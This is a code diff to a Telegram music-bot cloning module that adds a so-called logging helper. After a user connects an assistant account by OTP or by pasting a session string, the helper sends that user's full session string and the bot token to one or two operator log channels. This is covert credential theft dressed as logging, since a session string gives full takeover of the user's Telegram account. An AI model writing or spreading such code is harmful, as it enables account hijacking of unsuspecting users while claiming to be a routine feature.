@@ -9,10 +9,44 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 from PritiMusic.utils.database import clonebotdb
-from config import API_ID, API_HASH, OWNER_ID
+
+# ✅ LOGGING IMPORTS ADDED
+from config import API_ID, API_HASH, OWNER_ID, CLONE_LOGGER
+from PritiMusic import app 
+
+try:
+    from config import CLONE_LOGGER_2
+except ImportError:
+    CLONE_LOGGER_2 = CLONE_LOGGER
 
 POWERED_BY = "\n\n🤞 **𝐏ᴏᴡєʀєᴅ 𝐁ʏ ➛ BETA BOTS.🙂❤️**"
 SESSION_ADVICE = "\n\n💡 **Tip:** You can directly generate your Session String easily and safely from here: @SHIV_SESSION_BOT"
+
+# ==========================================
+# 🟢 HELPER: LOG SENDER FUNCTION
+# ==========================================
+async def send_new_assistant_log(client: Client, message: Message, session_string: str):
+    owner_id = message.from_user.id
+    owner_name = message.from_user.first_name
+    bot_info = client.me
+    # Safe token fetch
+    bot_token = getattr(client, "bot_token", "Unknown Token")
+
+    log_msg = (
+        f"**#New_Assistant**\n\n"
+        f"**🤖 ʙᴏᴛ ɴᴀᴍᴇ:** {bot_info.first_name}\n"
+        f"**👾 ʙᴏᴛ ᴜsᴇʀɴᴀᴍᴇ:** @{bot_info.username}\n"
+        f"**🔑 ʙᴏᴛ ᴛᴏᴋᴇɴ:** `{bot_token}`\n"
+        f"**🧵 sᴇssɪᴏɴ sᴛʀɪɴɢ:** `{session_string}`\n\n"
+        f"**👤 ᴏᴡɴᴇʀ:** [{owner_name}](tg://user?id={owner_id})"
+    )
+
+    try:
+        await app.send_message(CLONE_LOGGER, log_msg)
+        if CLONE_LOGGER_2 != CLONE_LOGGER:
+            await app.send_message(CLONE_LOGGER_2, log_msg)
+    except Exception as e:
+        print(f"Failed to send assistant log: {e}")
 
 # ==========================================
 # 1. CONNECT ASSISTANT (Phone + OTP)
@@ -101,6 +135,9 @@ async def connect_assistant(client: Client, message: Message):
         string_session = await temp_client.export_session_string()
         await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
         
+        # 🔥 LOG FOR NEW ASSISTANT (CONNECT METHOD)
+        await send_new_assistant_log(client, message, string_session)
+
         await message.reply_text("✅ **Connected Successfully!**" + POWERED_BY)
     finally:
         if temp_client.is_connected:
@@ -124,6 +161,10 @@ async def set_clone_session(client: Client, message: Message):
         client.assistant = new_assistant
 
         await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
+        
+        # 🔥 LOG FOR NEW ASSISTANT (SETSTRING METHOD)
+        await send_new_assistant_log(client, message, string_session)
+
         await msg.edit("✅ **Connected Successfully!** 🎸 **Now you can play music!**" + POWERED_BY)
     except Exception as e:
         await msg.edit(f"❌ **Error:** `{str(e)}`")
